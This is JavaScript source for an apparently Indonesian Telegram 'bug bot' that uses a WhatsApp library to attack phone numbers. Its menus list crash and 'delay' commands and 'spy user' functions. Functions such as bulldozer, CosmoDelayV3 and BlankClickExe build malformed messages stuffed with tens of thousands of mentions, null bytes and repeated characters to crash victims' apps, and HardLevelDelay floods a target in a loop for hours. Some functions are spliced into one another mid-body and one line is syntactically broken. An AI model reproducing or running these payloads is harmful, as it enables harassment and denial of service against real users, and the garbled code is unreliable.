        fs.unlinkSync(encryptedFilePath);
    } catch (err) {
        console.error("Error during encryption:", err);
        await ctx.reply(`❌ An error occurred: ${err.message}`);
    }
});

// ---- command /enc (to encrypt js files)
bot.command("encninecore", checkPremium, async (ctx) => {
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document) {
        return ctx.reply("❌ Silakan balas file .js untuk dienkripsi.");
    }

    const fileName = replyMessage.document.file_name;
    if (!fileName.endsWith(".js")) {
        return ctx.reply("❌ Hanya file .js yang dapat dienkripsi.");
    }

    try {
        const fileId = replyMessage.document.file_id;
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: "text" });
        let codeString = response.data;

        if (typeof codeString !== "string") {
            throw new Error("File bukan dalam format string yang valid.");
        }

        ctx.reply("⚡️ Lagi Diproses sama Cosmo... Sbar lek");

        let obfuscatedCode = await JsConfuser.obfuscate(codeString, {
            target: "node",
            preset: "high",
            compact: true,
            minify: true,
            controlFlowFlattening: 0.9,
            deadCode: 0.2,
            dispatcher: true,
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.4,
            stringConcealing: true,
            stringCompression: true,
            duplicateLiteralsRemoval: 0.8,
            shuffle: true,
            opaquePredicates: 0.85,
            calculator: true,
            hexadecimalNumbers: true,
            movedDeclarations: true,
            objectExtraction: true,
            globalConcealing: true,
            identifierGenerator: () => "高宝座FUCKHADES齐Xz高宝座" + Math.random().toString(36).substring(7),
        });

        if (typeof obfuscatedCode === 'object' && obfuscatedCode.code) {
            obfuscatedCode = obfuscatedCode.code;
        }

        if (typeof obfuscatedCode !== 'string') {
            throw new Error("Hasil enkripsi bukan dalam format string.");
        }

        console.log(typeof obfuscatedCode, obfuscatedCode);

        const encryptedFilePath = `./HadesEncrypted_${fileName}`;
        fs.writeFileSync(encryptedFilePath, obfuscatedCode, "utf-8");

        await ctx.replyWithDocument(
            { source: encryptedFilePath, filename: `encrypted_${fileName}` },
            { caption: `✅ Successful Encrypt\n• Type: Hades Nine Core\n• By @raysofhopee` }
        );

        fs.unlinkSync(encryptedFilePath);
    } catch (err) {
        console.error("Error during encryption:", err);
        await ctx.reply(`❌ An error occurred: ${err.message}`);
    }
});

//START SESI
startSesi();

bot.start(async (ctx) => {
  // Mengirim status "mengetik"
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

  // Periksa status koneksi, owner, admin, dan premium SEBELUM membuat pesan
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);

  const mainMenuMessage = "```\n┏─── ༽  𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ༼ ────┓\n│ Nᴀᴍᴇ : Hᴇғᴀɪsᴛᴏs ʜᴀᴅᴇs\n│ Dᴇᴠᴇʟᴏᴘᴇʀ : @raysofhopee\n│ Vᴇʀsɪᴏɴ : 𝟿.𝟶\n│ Lɪʙʀᴀʀʏ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ\n┗─────────────────────┛\n┏──── ༽  𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 ༼ ─────┓\n│ ᴄᴏsᴍᴏ - ʙᴀʀᴛᴢʏ - ʀɪᴄᴏ - ᴛɪᴀɴ\n│ ᴡᴏʟғ - ᴅᴏᴏᴍ - ᴘᴜᴛʀᴀ - ᴍᴀʀᴄᴢ\n│ ʜᴇɴɴ - ғᴀʀʜᴏsᴛ - sᴇɴᴢʏ - ᴀʟɪғᴀ\n│ xᴀᴛᴀɴɪᴄᴀʟ - ᴅᴇᴀғᴏʀᴛ - ɪᴄᴀᴛ\n│ ᴀʟʟ ᴛᴇᴀᴍ ʜᴇғᴀɪsᴛᴏs ʜᴀᴅᴇs. \n┗─────────────────────┛\n  ᴘʀᴇss ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ.```";

  const mainKeyboard = [
    [{
      text: "𝗕𝘂𝗴 𝗠𝗲𝗻𝘂",
      callback_data: "bugmenux"
    }],
      [{
      text: "𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 𝗠𝗲𝗻𝘂",
      callback_data: "settingcmd"
    }],
      [{
      text: "𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂",
      callback_data: "ownermenu"
    }],
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/zyyk9l.png", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

//HANDLER UNTUK BUGMENU
bot.action('bugmenux', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const mainMenuMessage = 
"```\n┏─── ༽  𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ༼ ────┓\n│ Nᴀᴍᴇ : Hᴇғᴀɪsᴛᴏs ʜᴀᴅᴇs\n│ Dᴇᴠᴇʟᴏᴘᴇʀ : @raysofhopee\n│ Vᴇʀsɪᴏɴ : 𝟿.𝟶\n│ Lɪʙʀᴀʀʏ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ\n┗─────────────────────┛\n┏───── ༽𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄༼ ──────┓\n│ /easydelay 62xx - ᴇᴀsʏ ᴅᴇʟᴀʏ\n│ /trickkill 62xx - ᴅᴇʟᴀʏ ᴄʀᴀsʜ\n│ /drain 62xx - ᴅᴇʟᴀʏ x ǫᴜᴏᴛᴀ ᴅʀᴀɪɴ\n│ /xcursed 62xx - ʜᴀʀᴅ ᴅᴇʟᴀʏ\n┗─────────────────────┛\n┏────── ༽𝐕𝐈𝐒𝐈𝐁𝐋𝐄༼───────┓\n│ /blankchat 62xx - ʙʟᴀɴᴋ ᴄʀᴀsʜ\n│ /2ndblank 62xx - ʙʟɴᴋ ᴄʀᴀsʜ ᴠ𝟸\n│ /trashapp 62xx - ᴛʀᴀsʜ xʙᴜɢ\n│ /vasion 62xx - sᴛᴀɴᴢᴀ x ʙʟᴀɴᴋ\n┗─────────────────────┛\n┏──────༽𝐍𝐎𝐓𝐄𝐒༼────────┓\n│ sᴇɴᴅᴇʀ ᴡᴀᴊɪʙ ᴡᴀ ᴏʀɪ (ɴᴏ ʙɪsɴɪs)\n│ ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴜɢ ʏ\n│ ᴅɪᴊᴇᴅᴀ 𝟻/𝟷𝟶ᴍɴᴛ ᴘᴇʀ ʙᴜɢ ɴʏᴀ.\n┗─────────────────────┛```";

  const mainKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
  }],
    [{
    text: "<♦>",
    url: "https://t.me/raysofhopee"
    }]
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/zyyk9l.png", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

// Handler untuk callback "owner_management"
bot.action('settingcmd', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const mainMenuMessage = 
"```\n┏─── ༽  𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ༼ ────┓\n│ Nᴀᴍᴇ : Hᴇғᴀɪsᴛᴏs ʜᴀᴅᴇs\n│ Dᴇᴠᴇʟᴏᴘᴇʀ : @raysofhopee\n│ Vᴇʀsɪᴏɴ : 𝟿.𝟶\n│ Lɪʙʀᴀʀʏ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ\n┗─────────────────────┛\n┏─── ༽ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 ༼───┓\n│ /cekusersc - sᴘʏ ᴜsᴇʀ sᴄʀɪᴘᴛ\n│ /monitoruser - sᴘʏ ᴜsᴇʀ ʙᴏᴛ\n│ /enchard - reply  .js\n│ /encninecore - reply  .js\n┗─────────────────────┛```";

  const mainKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
  }],
    [{
    text: "<♦>",
    url: "https://t.me/raysofhopee"
    }]
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/zyyk9l.png", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

bot.action('ownermenu', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const mainMenuMessage = 
"```\n┏─── ༽  𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ༼ ────┓\n│ Nᴀᴍᴇ : Hᴇғᴀɪsᴛᴏs ʜᴀᴅᴇs\n│ Dᴇᴠᴇʟᴏᴘᴇʀ : @raysofhopee\n│ Vᴇʀsɪᴏɴ : 𝟿.𝟶\n│ Lɪʙʀᴀʀʏ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ\n┗─────────────────────┛\n┏──── ༽  𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ༼ ───┓\n│ /addprem [ id ] [ 30d ]\n│ /delprem [ id ]\n│ /addadmin [ id ]\n│ /deladmin [ id ]\n│ /xconnect [ Number Whatsapp ]\n┗─────────────────────┛```";

  const mainKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
  }],
    [{
    text: "<♦>",
    url: "https://t.me/raysofhopee"
    }]
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/zyyk9l.png", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

// Handler untuk callback "main_menu"
bot.action('main_menu', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  // Kirim ulang menu utama (Anda dapat menggunakan kode yang sama seperti pada bot.start)
 const mainMenuMessage = "```\n┏─── ༽  𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ༼ ────┓\n│ Nᴀᴍᴇ : Hᴇғᴀɪsᴛᴏs ʜᴀᴅᴇs\n│ Dᴇᴠᴇʟᴏᴘᴇʀ : @raysofhopee\n│ Vᴇʀsɪᴏɴ : 𝟿.𝟶\n│ Lɪʙʀᴀʀʏ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ\n┗─────────────────────┛\n┏──── ༽  𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 ༼ ─────┓\n│ ᴄᴏsᴍᴏ - ʙᴀʀᴛᴢʏ - ʀɪᴄᴏ - ᴛɪᴀɴ\n│ ᴡᴏʟғ - ᴅᴏᴏᴍ - ᴘᴜᴛʀᴀ - ᴍᴀʀᴄᴢ\n│ ʜᴇɴɴ - ғᴀʀʜᴏsᴛ - sᴇɴᴢʏ - ᴀʟɪғᴀ\n│ xᴀᴛᴀɴɪᴄᴀʟ - ᴅᴇᴀғᴏʀᴛ - ɪᴄᴀᴛ\n│ ᴀʟʟ ᴛᴇᴀᴍ ʜᴇғᴀɪsᴛᴏs ʜᴀᴅᴇs. \n┗─────────────────────┛\n  ᴘʀᴇss ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ.```";

  const mainKeyboard = [
    [{
      text: "𝗕𝘂𝗴 𝗠𝗲𝗻𝘂",
      callback_data: "bugmenux"
    }],
      [{
      text: "𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 𝗠𝗲𝗻𝘂",
      callback_data: "settingcmd"
    }],
      [{
      text: "𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂",
      callback_data: "ownermenu"
    }],
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/zyyk9l.png", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

//func bug disini//////
async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
async function ExelionMbg(sock, target) {
const msg = {
  interactiveMessage: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363424218795720@newsletter",
              inviteCode: "𓆩᬴𓆪 ".repeat(15000),
              inviteExpiration: 99999,
              newsletterName: "\u0000".repeat(10000),
              caption: "ꦽ".repeat(10000),
              newsletterThumbnail: "https://files.catbox.moe/nflvex.jpg",
              contextInfo: {
                statusAttributionType: 2,
                statusAttributions: Array.from({ length: 15000 }, (_, z) => ({ type: 1 })),
                isForwarded: true,
                forwardingScore: 9741,
                participant: target
              }
            },
            interactiveResponseMessage: {
              header: {
                title: "\u0000" + "{{".repeat(25000)
              },
              body: {
                text: "Exelion !"
              },
              nativeFlowResponseMessage: {
                name: "cta_url",
                paramsJson: {"flow_cta":"${"\u0000".repeat(9000)}"},
                url: "https://mmg.whatsapp.net",
                merchantUrl: "t.me/TestimoniLikz",
                version: 3
              },
              entryPointConversionSource: "call_permission_request",
              contextInfo: {
                mentionedJid: Array.from({ length: 3000 }, () =>
${Math.floor(Math.random() * 9000)}@s.whatsapp.net
                )
              }
            }
          }
        }
await sock.relayMessage(target, msg, {
        participant: { jid: target },
    });
}
  const msg = generateWAMessageFromContent(target, message, {});

  await CosmoX.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function CosmoDelayV3(target, mention) {
    const protoMessage = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘" + "🥶".repeat(101),
                    height: 010,
                    width: 101,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "99988877766@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "uknown",
                                    songId: "870166291800508",
                                    author: "𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 𝟑" + "᭱".repeat(9999),
                                    title: "𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟐",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://t.me/FunctionLihX",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});
async function DelayFcExelion(sock, target) {
   const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "SV EXELION OM"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "booking_status",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(90000),
                  phone_number: "00000000000000"
                })
              }
            ],
            version: 3
          }
        }
      }
    }
  };
let congmsg = {
    groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "EXELION NI OM" + "\n"
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "[".repeat(10000),
                            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
                        }
                    }
                }
            }
        };
  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
  
  console.log("✅ SUCCESS SEND BUGS");
}
    await CosmoX.relayMessage("status@broadcast", protoMessage.message, {
        messageId: protoMessage.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await CosmoX.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: protoMessage.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function CosmoDelayV5(target, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
    title: "Finix",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "REVERSED BY COSMO",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await CosmoX.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await CosmoX.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function DelayExelion(sock, target) {
 const msg1 = {
      interactiveResponseMessage: {
        body: {
          text: "Exelion Om",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: '{"values":{"in_pin_code":"999999","building_name":"","landmark_area":"18","address":"Amp4","tower_number":"","city":"","name":"Amp4","phone_number":"999999999999","house_number":"13135550002","floor_number":"@3135550202","state":"X' + "\u0000".repeat(900000) + '"}}',
          version: 3
        }
      }
    };
     await sock.relayMessage(target, msg1, {
      participant: { jid: target },
    });
   }
async function HardLevelDelay(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
       }

        try {
    if (count < 400) {
        await Promise.all([
            CosmoDelayV5(target, false),
            CosmoDelayV3(target, false),
            bulldozer(target, false),
        ]);
        console.log(chalk.blue(`HARD DELAY ${count}/400 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
    } else {
        console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 400 Messages"));
        setTimeout(sendNext, 100);
    }
} catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 100);
}
};

sendNext();

}

//CRASH
async function CosmoUisystem(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "[̲̅𝖍𝕬𝖉𝖊𝖘",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "Reversed by Cosmo"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*Etichaly*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "Etichaly"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await CosmoX.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
        }

async function blank1(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "𝙷𝙰𝙳𝙴𝚂 𝙸𝚂 𝙷𝙴𝚁𝙴..." + "ោ៝".repeat(10000),
      caption: "𝙷𝙰𝙳𝙴𝚂 𝙸𝚂 𝙷𝙴𝚁𝙴..." + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await CosmoX.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function blank2(target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "𝙷𝙰𝙳𝙴𝚂 𝙸𝚂 𝙷𝙴𝚁𝙴..." + "ោ៝".repeat(10000),
      caption: "𝙷𝙰𝙳𝙴𝚂 𝙸𝚂 𝙷𝙴𝚁𝙴..." + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await CosmoX.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}
async function BlankClickExe(sock,target) {
  let msg;
  try {
    msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body: { text: "Exelion", format: 1 },
        nativeFlowResponseMessage: {
          name: "Exelion",
          paramsJson: JSON.stringify({
            wa_flow_response_params: {
              title: "𑇂𑆵𑆴𑆿".repeat(60000)
            }
          }),
          version: 3
        }
      }
    }, {
      participant: { jid: target }
    });
    await sock.relayMessage(target, msg.message, { participant: { jid: target } });

    await sock.relayMessage(target, {
      interactiveMessage: {
        body: {
          text: "Exelion Ni Om"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                total_amount: {
                  value: 999999999999,
                  offset: 100
                },
                reference_id: "\u0000".repeat(5000),
                order: {
                  status: "pending",
                  items: [
                    {
                      name: "𑇂𑆵𑆴𑆿".repeat(9999),
                      amount: { value: 100000, offset: 100 },
                      quantity: 99999
                    }
                  ]
                }
              })
            }
          ]
        }
      }
    }, { participant: { jid: target } });

    await sock.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "z".repeat(100000),
        publisher: "x".repeat(80000),
        stickers: [],
        fileLength: 9999999999999,
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
        packDescription: "y".repeat(70000),
        stickerPackOrigin: "USER_CREATED"
      }
    }, {});

